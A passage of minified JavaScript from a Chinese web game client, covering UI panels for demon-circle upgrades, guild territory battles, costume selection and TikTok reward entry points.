活"),this.eProBarGrp.visible=!1,this.bmpTxtLv.text="0";var o=[],j=[],V=y.DemonCir.ins().getDemonCirLevelCfg(this.curCfg.id,1);if(V){var Y=void 0;for(var K in V.attrs){Y=V.attrs[K];var f=l.AttributeData.changeJobAttr(Y.type,e),g=l.AttributeData.getRelationJobAttr(f);g&&(o.push(new l.AttributeData(g,0)),j.push(new l.AttributeData(g,0))),o.push(new l.AttributeData(f,0)),j.push(new l.AttributeData(f,Y.value))}o=l.AttributeData.combineAtts(o),j=l.AttributeData.combineAtts(j),this.nowAttr.textFlow=a.TextFlowMaker.generateTextFlow1(l.AttributeData.getAttStr1(o,t)),this.nextAttr.textFlow=a.TextFlowMaker.generateTextFlow1(l.AttributeData.getAttStr1(j,t))}}this.yunyang.visible=!this.isMaxSkill,this.skillMaxDesc.visible=this.isMaxSkill,this.nowAttrScroll.visible=!this.isMaxLv||!this.isMaxSkill,this.nextAttrScroll.visible=!this.isMaxLv||!this.isMaxSkill,this.maxAttrScroll.visible=this.isMaxLv&&this.isMaxSkill,this.arrow.visible=!this.isMaxLv||!this.isMaxSkill,this.nowAttrTxt.left=this.isMaxLv&&this.isMaxSkill?280:100,this.nextAttrTxt.visible=!this.isMaxLv||!this.isMaxSkill,this.updateBar(),this.updateShowBtn()},e.prototype.updateBar=function(){if(this.actived){var t=y.DemonCir.ins().getRoleDataByID(this.roleIndex),e=t.getDemonDataByID(this.curCfg.id),i=y.DemonCir.ins().getDemonCirLevelCfg(this.curCfg.id,e.level);if(i){e.exp/i.exp*100;100==this.bar.value&&(this.bar.slideDuration=0,this.bar.value=0),this.bar.slideDuration=500,this.barLab.text=e.exp+"/"+i.exp,this.bar.value=e.exp/i.exp*100,this.preBarVal=this.bar.value,this.maxBarVal=i.exp,Timer.stop(this.updateBarText,this),Timer.start(30,-1,this.updateBarText,this)}}},e.prototype.updateBarText=function(){var t=this.bar.animationValue,e=Math.floor(t/100*this.maxBarVal);this.barLab.text=e+"/"+this.maxBarVal,t==this.bar.value&&Timer.stop(this.updateBarText,this)},e.prototype.updateMaterail=function(){if(this.curCfg){var t=y.DemonCir.ins().getYunyanCost(this.curCfg.id);t&&(this.cost0.setData(t,!1),this.yunyangcost.setData(this.curCfg.skillcost,!1),this.updateRed())}},e.prototype.updateRed=function(){var t;this.ability.updateRed();var e=y.DemonCir.ins().getYunyanCost(null===(t=this.curCfg)||void 0===t?void 0:t.id);this.shengjiBtn.eRp&&(this.shengjiBtn.eRp.visible=e&&s.GlobalFun.checkCost(e.count,e.id,"",!1)),this.yunyangBtn.eRp&&(this.yunyangBtn.eRp.visible=this.actived&&this.curCfg&&this.curCfg.skillcost&&s.GlobalFun.checkCost(this.curCfg.skillcost.count,this.curCfg.skillcost.id,"",!1))},e.prototype.getTotalAttrByLvl=function(t){var e=[],i=y.DemonCir.ins().getDemonCirLevelCfg(this.curCfg.id,t);if(!i)return null;var n,o=c.ActorCC.jobId;for(var s in i.attrs){n=i.attrs[s];var a=l.AttributeData.changeJobAttr(n.type,o);
e.push(new l.AttributeData(a,n.value));var r=l.AttributeData.getRelationJobAttr(a);r&&e.push(new l.AttributeData(r,0))}var h=[];return h=h.concat(e)},e.prototype.getTZAttrs=function(t,e){var i=[],n=t.length,o=y.DemonCir.ins().getDemonCirLevelCfg(this.curCfg.id,e);if(!o)return i;for(var s=o.attrs,a=s.length,r=0;n>r;r++){var h=t[r];if(p.GlobalConfig.DemonCirTeZhi[h.id]&&p.GlobalConfig.DemonCirTeZhi[h.id][h.lvl])for(var u=p.GlobalConfig.DemonCirTeZhi[h.id][h.lvl],d=0;a>d;d++){var c=s[d];if(u.attrs.type==c.type){i.push(new l.AttributeData(u.attrs.type,Math.floor(u.attrs.per*c.value/1e4)));break}}}return i},e.prototype.updateShowBtn=function(){var t,e=y.DemonCir.ins().getRoleDataByID(0),i=e&&e.showID==(null===(t=this.curCfg)||void 0===t?void 0:t.id);this.showBtn.enabled=this.actived&&!i},e.prototype.tabRp=function(){return C.DemonCirRedPoint.ins().redPoint},e.prototype.getTeZhiLvl=function(t,e){var i=p.GlobalConfig.DemonCirTeZhi[t];if(!i)return 0;for(var n,o=Object.keys(i).length,s=1;o>=s;s++){if(n=i[s],e<n.dcMinLv)return n.tezhiLv-1;if(e>=n.dcMinLv&&e<=n.dcMaxLv)return n.tezhiLv}return n.tezhiLv},e.prototype.onTap=function(t){var e,i;switch(t.target){case this.help:win.open(g.CommonHelpWin,(null===(e=p.GlobalConfig.HelpInfoConfig[336])||void 0===e?void 0:e.text)||"");break;case this.shengjiBtn:var n=y.DemonCir.ins().getYunyanCost(null===(i=this.curCfg)||void 0===i?void 0:i.id);if(!n)return;if(!s.GlobalFun.checkCost(n.count,n.id))return;this.actived?y.DemonCir.ins().sendDemonLevelUp(0,this.curCfg.id):y.DemonCir.ins().sendActiveDemon(0,this.curCfg.id);break;case this.showBtn:y.DemonCir.ins().sendShowChange(0,this.curCfg.id);break;case this.yunyangBtn:if(!this.actived)return void v.TipsCT.ins().showTips(gettext("法阵尚未激活"));if(!this.curCfg||!this.curCfg.skillcost||!s.GlobalFun.checkCost(this.curCfg.skillcost.count,this.curCfg.skillcost.id))return;y.DemonCir.ins().sendSpecialUp(this.roleIndex,this.curCfg.id)}},e.prototype.updateSpSkillItem=function(){var t,e,i=this.curCfg.skillgroup.length;this.spSkillObj=[];for(var n,o=0,s=0;5>s;s++){if(t=this["potential"+s],e=null,n=!1,i>s){if(t.visible=!0,n=this.actived){var a=y.DemonCir.ins().getRoleDataByID(this.roleIndex),r=a.getDemonDataByID(this.curCfg.id);n=r.getActiveByIndex(s),n&&(e=r.specialVals[s])}t.setData({id:this.curCfg.skillgroup[s],actived:n,param:e})}else t.visible=!1;for(var h=p.GlobalConfig.DemonCirSkill[this.curCfg.skillgroup[s]],u=void 0,d=Object.keys(h).length,f=e?e.length:0,g=!0,m=0;d>m;m++){u=f>m?e[m]:null;var v=h[m+1];if(2==v.skillType){if(n){var C=this.getColorByValue(u.value,v.attrMax),T={allAdd:(u.value/100).toFixed(1),color:C};this.spSkillObj.push(T)}}else{var C=12410893,b=l.AttributeData.changeJobAttr(v.attrType,c.ActorCC.jobId),T={attr:new l.AttributeData(b,u?u.value:0),color:C};this.spSkillObj.push(T)}(!u||u.value<v.attrMax)&&(g=!1)}g&&o++}this.isMaxSkill=o>=5},e.prototype.getColorByValue=function(t,e){var i=+(t/e*100).toFixed(1);return 19>=i?10458221:i>=20&&39>=i?4251448:i>=40&&59>=i?10562239:12410893},e.prototype.onPageClick=function(t){var e=Object.keys(p.GlobalConfig.DemonCirBase).length;switch(t.target){case this.leftBtn:this.pageId=this.pageId>1?this.pageId-1:e;break;case this.rightBtn:this.pageId=this.pageId>=e?1:this.pageId+1}this.nowAttrScroll.viewport.scrollV=0,this.nextAttrScroll.viewport.scrollV=0,this.maxAttrScroll.viewport.scrollV=0,this.curCfg=p.GlobalConfig.DemonCirBase[this.pageId],this.updateView()},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=y.DemonCir.ins().checkOpen();return i||v.TipsCT.ins().showTips(m.OpenSystem.ins().getNoOpenTips(d.SystemType.DEMON_CIR)),i},e.showCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return m.OpenSystem.ins().checkSysShow(d.SystemType.DEMON_CIR)},e.prototype.removeDisplay=function(){this.skin&&(this.deEff&&(n.DisplayUtils.removeFromParent(this.deEff),this.deEff=null),this.deEffLeft&&(n.DisplayUtils.removeFromParent(this.deEffLeft),this.deEffLeft=null),this.deEffRight&&(n.DisplayUtils.removeFromParent(this.deEffRight),this.deEffRight=null))},__decorate([delayCall(600)],e.prototype,"updateBar",null),e}(r.BaseView);e.DemonCirPanel=b,window.DemonCirPanel=b,__reflect(b.prototype,"DemonCirPanel",[]),window.DemonCirPanel=b},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DemonCirRoleData=void 0;var n=i(374),o=function(){function t(t){t?this.parser(t):this.debugData()}return t.prototype.debugData=function(){this.roleID=0,this.demonCirDatas=[],this.showID=0},t.prototype.parser=function(t){this.roleID=t.readByte();var e=t.readByte();this.demonCirDatas||(this.demonCirDatas=[]);for(var i=0;e>i;i++){var o=t.readByte();t.position--;var s=this.demonCirDatas[o];s?s.parser(t):(s=new n.DemonCirData(t),this.demonCirDatas[o]=s)}this.showID=t.readByte()},t.prototype.getDemonDataByID=function(t){return this.demonCirDatas&&this.demonCirDatas.length?this.demonCirDatas[t]:null},t.prototype.addDemonData=function(t,e){this.demonCirDatas&&(this.demonCirDatas[t]=e)},t}();e.DemonCirRoleData=o,window.DemonCirRoleData=o,__reflect(o.prototype,"DemonCirRoleData",[]),window.DemonCirRoleData=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DCTeZhiTipsWin=void 0;var n=i(1),o=i(115),s=i(0),a=i(5),r=function(t){function e(){var e=t.call(this)||this;return e._sn_="DCTeZhiTips",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.data=t[0],this.addTouchEvent(this,this.onTouch),observe(this,this.update,o.DemonCir.ins().postDemonCirLevelCfg),this.update()},e.prototype.update=function(){if(this.data&&s.GlobalConfig.DemonCirTeZhi[this.data.id]){this.currentState=this.data.actived?"activated":"lock";var t=this.data.actived&&this.data.level>=Object.keys(s.GlobalConfig.DemonCirTeZhi[this.data.id]).length;if(this.nextGroup.visible=this.data.actived&&!t,!t){var e=s.GlobalConfig.DemonCirTeZhi[this.data.id][this.data.level+1];if(e){var i=this.data.level>=e.dcMinLv?65280:16711680;this.skillName0.textFlow=a.TextFlowMaker.generateTextFlow(e.name),this.skillDesc0.textFlow=a.TextFlowMaker.generateTextFlow(e.desc.replace("%s",this.getAddValue(e)+"")),this.condition0.textFlow=a.TextFlowMaker.generateTextFlow("|C:"+i+"&T:"+e.dcMinLv)}}var n=s.GlobalConfig.DemonCirTeZhi[this.data.id][this.data.actived?this.data.level:1];if(n){this.skillName2.textFlow=a.TextFlowMaker.generateTextFlow(n.name),this.skillDesc2.textFlow=a.TextFlowMaker.generateTextFlow(n.desc.replace("%s",this.data.actived?this.getAddValue(n)+"":""));var i=this.data.level>=n.dcMinLv?65280:16711680;this.condition2.textFlow=a.TextFlowMaker.generateTextFlow(t?gettext("已满级"):this.data.actived?"":gettext("|C:{0}&T:法阵等级达到|C:{1}&T:{2}级|C:{3}&T:解锁|",16777164,i,n.dcMinLv,16777164))}}},e.prototype.getAddValue=function(t){var e=o.DemonCir.ins().getDemonCirLevelCfg(this.data.demonID,this.data.demonLvl);if(!e||!t)return 0;for(var i=e.attrs,n=i.length,s=0;n>s;s++){var a=i[s];if(t.attrs.type==a.type)return Math.floor(t.attrs.per*a.value/1e4)}return 0},e.prototype.onTouch=function(t){t.target==this.bgClose&&win.close(this)},__decorate([delayCall()],e.prototype,"update",null),e}(n.BaseView);e.DCTeZhiTipsWin=r,window.DCTeZhiTipsWin=r,__reflect(r.prototype,"DCTeZhiTipsWin",[]),window.DCTeZhiTipsWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DCAbilityTipsWin=void 0;var n=i(5),o=i(1),s=i(0),a=i(6),r=i(115),l=i(10),h=i(19),u=function(t){function e(){var e=t.call(this)||this;return e._sn_="DCAbilityTips",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTouch),observe(this,this.updateMaterail,a.BagCT.ins().postItemAdd),observe(this,this.updateMaterail,a.BagCT.ins().postItemChange),observe(this,this.updateMaterail,a.BagCT.ins().postItemDel),observe(this,this.update,r.DemonCir.ins().postTalentUp),this.roleId=t[0],this.id=t[1],this.isActived=t[2],this.update()},e.prototype.onTouch=function(t){switch(t.target){case this.closeBtn:win.close(this);break;case this.updateBtn:if(this.costObj&&!h.GlobalFun.checkCost(this.costObj.count,this.costObj.id))return;r.DemonCir.ins().sendTalentUp(this.roleId,this.id);break;case this.getItemTxt:win.open("ShopGoodsWarn").setData(s.GlobalConfig.DemonCirBase[this.id].mat)}},e.prototype.update=function(){var t=s.GlobalConfig.DemonCirBase[this.id];this.nametxt.textFlow=n.TextFlowMaker.generateTextFlow(t.talentName);var e=0;if(this.isActived){var i=r.DemonCir.ins().getRoleDataByID(this.roleId),o=i.getDemonDataByID(this.id);e=o.talentLv,this.costImg.source=null,this.costImg.source=l.ItemUtil.getItemSource(s.GlobalConfig.ItemConfig[t.mat])}this.nowDesctxt.textFlow=n.TextFlowMaker.generateTextFlow(e?r.DemonCir.ins().getUpgradeDesc(t.talent,e):gettext("未激活")),this.nextTitle.visible=!0,this.nextDesctxt.visible=!0,this.updateBtn.visible=this.isActived,this.redpoint.visible=!1,this.cost.visible=this.isActived,this.lvtxt.textFlow=n.TextFlowMaker.generateTextFlow("Lv."+e),this.deEff||(this.deEff=ObjectPool.pop("MovieClip")),this.deEff.parent||this.demonCirEff.addChild(this.deEff),this.deEff.playFile(""+RES_DIR_EFF+t.winEff,-1),this.isMax=e>=Object.keys(s.GlobalConfig.DemonCirTalent[t.talent]).length,this.isMax?(this.nextTitle.visible=!1,this.nextDesctxt.visible=!1,this.updateBtn.visible=!1,this.cost.visible=!1):this.nextDesctxt.textFlow=n.TextFlowMaker.generateTextFlow(r.DemonCir.ins().getUpgradeDesc(t.talent,e+1)),this.updateMaterail(),this.abilityImg.source=t.talentImg},e.prototype.updateMaterail=function(){if(this.costObj=null,this.isActived&&!this.isMax){var t=s.GlobalConfig.DemonCirBase[this.id];if(t&&s.GlobalConfig.DemonCirTalent[t.talent]){var e=r.DemonCir.ins().getRoleDataByID(this.roleId),i=e.getDemonDataByID(this.id),o=s.GlobalConfig.DemonCirTalent[t.talent][i.talentLv+1];if(o){var l=a.BagCT.ins().getBagItemById(t.mat),h=l?l.count:0;this.isEnough=h>=o.costCount,this.costObj={type:1,id:t.mat,count:o.costCount},this.costNum.textFlow=n.TextFlowMaker.generateTextFlow("|C:"+(this.isEnough?13746831:16711680)+"&T:"+h+"|/"+o.costCount),this.redpoint.visible=!this.isMax&&this.isEnough}}}},e}(o.BaseView);e.DCAbilityTipsWin=u,window.DCAbilityTipsWin=u,__reflect(u.prototype,"DCAbilityTipsWin",[]),window.DCAbilityTipsWin=u},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateWorldFightPanel=void 0;var n=i(8),o=i(1),s=i(32),a=i(7),r=i(78),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="DominateFightSkin",e._startTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.infoBtn,this.openFightResult)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.setPlayeScore,r.DominateWorldCT.ins().updatePlayerScoreFB),observe(this,this.setTotemScore,r.DominateWorldCT.ins().updateTotemScoreFB),this.setBaseScore()},e.prototype.removeDisplay=function(){Timer.stop(this.updateTeamFbTime,this),this.removeObserve(),this.removeTouchEvent(this.infoBtn,this.openFightResult)},e.prototype.openFightResult=function(){switch(r.DominateWorldCT.ins().nowFightType){case 1:r.DominateWorldCT.ins().sendDominateTotemFight();break;case 2:r.DominateWorldCT.ins().sendDominateMagicSwordFight();break;case 3:r.DominateWorldCT.ins().sendDominateNimbusFightDesc()}},e.prototype.startCountDown=function(){Timer.stop(this.updateTeamFbTime,this),this.updateTeamFbTime(),Timer.start(1e3,0,this.updateTeamFbTime,this)},e.prototype.updateTeamFbTime=function(){if(this.leftTime){var t=(n.DateUtils.formatMiniDateTime(s.FbCT.ins().curFbLeftTime)-a.GameServerCC.serverTime)/1e3;return this.leftTime.text=0>=t?"":n.DateUtils.getFormatBySecond(t,n.DateUtils.TIME_FORMAT_5,4),0>=t?(this.leftTime.text="",void Timer.stop(this.updateTeamFbTime,this)):void t--}},e.prototype.setPlayeScore=function(t){this.score&&(this.score.text=t+"")},e.prototype.setTotemScore=function(t){this.blueScore&&(this.blueScore.text=t.AS,this.redScore.text=t.BS)},e.prototype.setBaseScore=function(){this.redScore.text=this.blueScore.text="0"},e.prototype.closeDominateFightUI=function(){Timer.stop(this.updateTeamFbTime,this),this.visible=!1,this.redScore.text=this.blueScore.text="0"},e}(o.BaseView);e.DominateWorldFightPanel=l,window.DominateWorldFightPanel=l,__reflect(l.prototype,"DominateWorldFightPanel",[]),window.DominateWorldFightPanel=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateWorldPanel=void 0;var n=i(70),o=i(1),s=i(0),a=i(15),r=i(107),l=i(28),h=i(12),u=i(2),p=i(376),d=i(377),c=i(78),f=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DominateWorldPanelSkin",e.idx=-1,e.isDefault=!1,e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t?t[0]:!1,n=h.OpenSystem.ins().checkSysOpen(a.SystemType.Dominate);return n||i||u.TipsCT.ins().showTips(h.OpenSystem.ins().getNoOpenTips(a.SystemType.Dominate)),c.DominateWorldCT.ins().isOpenWin?n:(c.DominateWorldCT.ins().isPanelOpen=!0,c.DominateWorldCT.ins().sendDominateInfo(),n)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.isDefault=0==c.DominateWorldCT.ins().panelCount?!0:!1,this.iList.itemRenderer=d.DominateNameItem;var i=[],n=s.GlobalConfig.DominationBtLvCfg;if(n)for(var o in n)i.push(n[o].townlevelname);this.iList.dataProvider=new eui.ArrayCollection(i),this.iList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.addTouchEvent(this.btnjihuo,this.onTouchs),this.addTouchEvent(this.btnSet,this.onTouchs),this.addTouchEvent(this.btnCome,this.onTouchs),this.addTouchEvent(this.btn_help,this.onTouchs),observe(this,this.setApplicationState,c.DominateWorldCT.ins().updateApplicationState),observe(this,this.setFightSetting,c.DominateWorldCT.ins().updateApplicationState),observe(this,this.updateComeGameBtn,c.DominateWorldCT.ins().updateDominateWorldBtnShow),observe(this,this.updateRed,c.DominateWorldCT.ins().updateAward),observe(this,this.updateRed,c.DominateWorldCT.ins().updateDominateWorldBtnShow),c.DominateWorldCT.ins().sendApplicationDominate(),this.setPage(),this.setApplicationState(),this.setFightSetting(),this.updateComeGameBtn(),c.DominateWorldCT.ins().isOpenWin=!1,this.updateRed()},e.prototype.updateComeGameBtn=function(){this.btnCome.visible=c.DominateWorldCT.ins().myWorldId>0,c.DominateWorldCT.ins().fbSwitch&&(this.btnSet.visible=!1)},e.prototype.onItemClick=function(t){t.itemIndex!=this.idx&&(this.idx=t.itemIndex,this.clearPage(),this.setPage())},e.prototype.onTouchs=function(t){var e;switch(t.target){case this.btnSet:c.DominateWorldCT.ins().sendDominateTotem();break;case this.btnjihuo:if(0==l.Guild.ins().guildID)return void u.TipsCT.ins().showTips(gettext("先加入公会"));if(l.Guild.ins().myOffice<r.GuildOffice.GUILD_JINGYING)return void u.TipsCT.ins().showTips(gettext("需要精英成员以上级别才可以报名"));c.DominateWorldCT.ins().sendApplicationComeDominate();break;case this.btnCome:c.DominateWorldCT.ins().myWorldId&&c.DominateWorldCT.ins().sendDominateWorldDesc(c.DominateWorldCT.ins().myWorldId);break;case this.btn_help:win.open("CommonHelpWin",(null===(e=s.GlobalConfig.HelpInfoConfig[358])||void 0===e?void 0:e.text)||"")}},e.prototype.setFightSetting=function(){c.DominateWorldCT.ins().myWorldType==c.fightEnum.TotemFight&&2==c.DominateWorldCT.ins().actState&&l.Guild.ins().myOffice>=r.GuildOffice.GUILD_JINGYING?(this.btnSet.visible=!0,c.DominateWorldCT.ins().fbSwitch&&(this.btnSet.visible=!1)):this.btnSet.visible=!1},e.prototype.setPage=function(){this.isDefault?this.setPageByLv():this.setPageByInfo()},e.prototype.setPageByInfo=function(){var t=this.idx<=0?1:this.idx+1,e=s.GlobalConfig.DominationBtLvCfg;if(e)for(var i=e[t].max,n=c.DominateWorldCT.ins().returnLvInfo(t),o=0;i>o;o++){var a=new p.DominateCityItem;a.lv=t,a.cityIdx=n.worldData[o].id,a.isDef=this.isDefault,this.fightGrop.addChild(a),a.x=e[t].locat[o][0],a.y=e[t].locat[o][1]}},e.prototype.setPageByLv=function(){var t=this.idx<=0?1:this.idx+1,e=s.GlobalConfig.DominationBtLvCfg;if(e)for(var i=e[t].max,o=0;i>o;o++){var a=new p.DominateCityItem;a.lv=t,a.cityIdx=o,a.type=n.MathUtils.random(1,3),a.isDef=this.isDefault,this.fightGrop.addChild(a),a.x=e[t].locat[o][0],a.y=e[t].locat[o][1]}},e.prototype.setApplicationState=function(){switch(c.DominateWorldCT.ins().applicationState){case 0:this.btnjihuo.visible=!1,this.cityDesc.visible=!0;var t=s.GlobalConfig.DominationBtLvCfg;if(t){var e=c.DominateWorldCT.ins().returnWorldIdInfo(c.DominateWorldCT.ins().myWorldId);if(e){var i=e.lv,n=e.idx;this.cityName0.text=t[i].townName[n]}else this.btnjihuo.visible=!0,this.btnjihuo.enabled=!1,this.btnjihuo.label=gettext("不能报名"),this.cityDesc.visible=!1}c.DominateWorldCT.ins().entityServer>0?this.guideName0.text=c.DominateWorldCT.ins().entityServerName+"[S"+c.DominateWorldCT.ins().entityServer+"]":this.guideName0.text=gettext("无");break;case 1:this.btnjihuo.visible=!0,this.btnjihuo.enabled=!1,this.btnjihuo.label=gettext("已报名"),this.cityDesc.visible=!1;break;case 2:this.btnjihuo.visible=!0,this.btnjihuo.enabled=!0,this.btnjihuo.label=gettext("报 名"),this.cityDesc.visible=!1}},e.prototype.clearPage=function(){if(this.fightGrop.numElements>1)for(var t=this.fightGrop.numElements-1;t>=1;t--){var e=this.fightGrop.getElementAt(t);e instanceof p.DominateCityItem&&(e&&e.clearAll&&e.clearAll(),this.fightGrop.removeChildAt(t))}},e.prototype.tabRp=function(){return c.DominateWorldCT.ins().AllBagRed.v},e.prototype.updateRed=function(){this.tabRp(),this.btnCome&&this.btnCome.eRp&&(this.btnCome.eRp.visible=2==c.DominateWorldCT.ins().resultAward||c.DominateWorldCT.ins().fbSwitch)},e}(o.BaseView);e.DominateWorldPanel=f,window.DominateWorldPanel=f,__reflect(f.prototype,"DominateWorldPanel",[]),window.DominateWorldPanel=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateWorldRule=void 0;var n=i(15),o=i(28),s=i(41),a=i(12),r=i(78),l=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([r.DominateWorldCT.ins().updateDominateWorldBtnShow]),i}return __extends(e,t),e.prototype.checkShow=function(){var t=a.OpenSystem.ins().checkSysOpen(n.SystemType.Dominate);return t&&(r.DominateWorldCT.ins().fbSwitch||1==r.DominateWorldCT.ins().actState)&&o.Guild.ins().guildID>0},e.prototype.tapEvt=function(){r.DominateWorldCT.ins().isRuleOpen=!0,r.DominateWorldCT.ins().sendDominateInfo()},e}(s.PayfunIconData);e.DominateWorldRule=l,window.DominateWorldRule=l,__reflect(l.prototype,"DominateWorldRule",[]),window.DominateWorldRule=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DressTabItem=e.DressMainWin=void 0;var n=i(3),o=i(1),s=i(0),a=i(6),r=i(128),l=i(849),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DressMainSkin",e.itemlistArr=new eui.ArrayCollection,e.tabIdx=0,e.toType=[r.TitleType.Outward,r.TitleType.Head],e}return __extends(e,t),e.prototype.skinComplete=function(){this.tabList.itemRenderer=u,this.tabList.dataProvider=new eui.ArrayCollection([gettext("外观"),gettext("头像")]),this.itemlist.itemRenderer=l.DressItem,this.itemlist.dataProvider=this.itemlistArr,this.tabList.selectedIndex=this.tabIdx},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.tabList.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),observe(this,this.updateList,r.Title.ins().postUpdateOutward),this.updateList()},e.prototype.updateList=function(){var t=[],e=s.GlobalConfig.TitleConf;for(var i in e)e[i].type==this.toType[this.tabIdx]&&this.checkCanShow(e[i])&&t.push(e[i]);t.unshift({Id:0,type:this.toType[this.tabIdx]}),this.itemlistArr.replaceAll(t)},e.prototype.checkCanShow=function(t){var e=!1,i=r.Title.ins().timeDict[t.Id];1==t.defaultShow&&(e=!0);var n=a.BagCT.ins().getBagGoodsCountById(a.BagCT.BAG_TYPE_OTHTER,t.activeItemId);return 0==t.defaultShow&&t.activeItemId&&n>0&&(e=!0),void 0!=i&&(e=!0),e},e.prototype.onItemClick=function(t){this.tabIdx!=t.itemIndex&&(this.tabIdx=t.itemIndex,this.updateList())},e}(o.BaseView);e.DressMainWin=h,window.DressMainWin=h,__reflect(h.prototype,"DressMainWin",[]);var u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.labelDisplay&&(this.labelDisplay.text=this.data||"")},e}(n.BaseItemRender);e.DressTabItem=u,window.DressTabItem=u,__reflect(u.prototype,"DressTabItem",[]),window.DressTabItem=u,window.DressMainWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DressItem=void 0;var n=i(8),o=i(5),s=i(3),a=i(22),r=i(13),l=i(7),h=i(128),u=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.createChildren=function(){this.gobtn.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClick,this),Timer.stopAll(this)},e.prototype.dataChanged=function(){if(this.timeLab.text="",0==this.data.Id)return this.nameLab.text=gettext("默认外观"),this.icon.source="entity_bg",this.desLab.text=gettext("初始外观形象"),this.attrLab.textFlow=[],this.timeLab.text="",void this.updateItem();this.nameLab.text=this.data.name||"",this.icon.source=this.data.img+"_png"||!1,this.desLab.text=this.data.condition||"";var t=a.AttributeData.getAttrShowStr(this.data.attrs,": "),e="";t&&t.replace&&(e=t.replace("\n","  ")),this.attrLab.textFlow=o.TextFlowMaker.generateTextFlow(e),this.updateItem();var i=h.Title.ins().timeDict[this.data.Id];if(i){var s=(n.DateUtils.formatMiniDateTime(i)-l.GameServerCC.serverTime)/1e3;s&&(this.timeLab.text=n.DateUtils.getFormatBySecond(s,n.DateUtils.TIME_FORMAT_1),Timer.start(1e3,0,this.updateTime,this))}},e.prototype.updateItem=function(){var t=r.SubRoles.ins().getSubRoleByIndex(0);if(0==this.data.Id)return this.signImg.visible=t.outward==this.data.Id,this.gobtn.visible=!this.signImg.visible,this.signImg.visible&&(this.signImg.source="chenghao_syz"),void(this.gobtn.visible&&(this.gobtn.label=gettext("展示")));var e=h.Title.ins().timeDict[this.data.Id];if(void 0==e){var i=!1;this.gobtn.visible=i,this.signImg.visible=!this.gobtn.visible,this.signImg.visible&&(this.signImg.source="Skill_wjh")}else{var n=t.outward==this.data.Id;this.gobtn.visible=!n,this.signImg.visible=!this.gobtn.visible,this.signImg.visible&&(this.signImg.source="chenghao_syz"),this.gobtn.visible&&(this.gobtn.label=gettext("展示"))}},e.prototype.updateTime=function(){var t=h.Title.ins().timeDict[this.data.Id];if(t){var e=(n.DateUtils.formatMiniDateTime(t)-l.GameServerCC.serverTime)/1e3;return 0>=e?(this.timeLab.text="",void Timer.stop(this.updateTime,this)):void(this.timeLab.text=n.DateUtils.getFormatBySecond(e,n.DateUtils.TIME_FORMAT_1))}},e.prototype.onClick=function(){h.Title.ins().sendChangeShow(this.data.Id,this.data.type),console.error("id:"+this.data.Id+"   type:"+this.data.type)},e}(s.BaseItemRender);e.DressItem=u,window.DressItem=u,__reflect(u.prototype,"DressItem",[]),window.DressItem=u},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DYDesktopAddRule=void 0;var n=i(20),o=i(41),s=i(116),a=i(378),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.TikTokCT.ins().updateAwardData]),i}return __extends(e,t),e.prototype.checkShow=function(){return urlParam.isTikTokGame&&s.TikTokCT.ins().returnIsOver(2)},e.prototype.tapEvt=function(){n.GameMap.checkIsKf()||win.open(a.DyDesktopAddWin)},e}(o.PayfunIconData);e.DYDesktopAddRule=r,window.DYDesktopAddRule=r,__reflect(r.prototype,"DYDesktopAddRule",[]),window.DYDesktopAddRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DYSidebarRule=void 0;var n=i(20),o=i(41),s=i(116),a=i(379),r=function(t){function e(e){var i=t.call(this,e)||this;return i.cfg=e,i.showMsg([s.TikTokCT.ins().updateAwardData]),i}return __extends(e,t),e.prototype.checkShow=function(){return urlParam.isTikTokGame&&s.TikTokCT.ins().returnIsOver(1)},e.prototype.tapEvt=function(){n.GameMap.checkIsKf()||win.open(a.DYSidebarWin)},e}(o.PayfunIconData);e.DYSidebarRule=r,window.DYSidebarRule=r,__reflect(r.prototype,"DYSidebarRule",[]),window.DYSidebarRule=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TikTokAwardType=e.DyGameAwardWin=void 0;var n=i(1),o=i(11),s=i(0),a=i(116),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DyXcxReward",e.defaultRect=!0,e.oldIndex=-1,e}return 